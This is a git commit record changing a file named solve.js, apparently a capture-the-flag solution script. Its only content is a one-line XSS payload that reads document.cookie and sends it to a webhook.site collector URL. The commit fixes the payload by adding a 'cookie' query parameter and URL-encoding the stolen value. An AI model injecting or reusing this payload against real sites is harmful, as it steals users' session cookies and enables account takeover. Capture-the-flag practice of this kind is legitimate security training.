40a05518e4a08d3f7cb806e758a0dc4cba43ad6a
Suet1 <70423560+Suet1@users.noreply.github.com>
2025-03-22 16:02:10 +0800

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,3 +1,1 @@
-
-
-fetch('https://webhook.site/d3e56ae7-2c54-42d9-b9d3-3267852c9b39' + document.cookie)
+fetch('https://webhook.site/d3e56ae7-2c54-42d9-b9d3-3267852c9b39?cookie=' + encodeURIComponent(document.cookie))
